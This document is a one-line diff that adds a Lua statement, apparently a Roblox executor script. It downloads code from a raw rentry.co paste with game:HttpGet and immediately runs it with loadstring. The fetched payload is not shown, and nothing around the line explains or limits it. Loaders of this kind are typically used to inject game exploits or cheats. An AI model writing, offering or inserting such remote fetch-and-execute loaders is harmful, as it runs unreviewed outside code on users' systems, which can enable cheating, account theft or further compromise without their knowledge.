@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://rentry.co/wtg7o5a5/raw',true))()
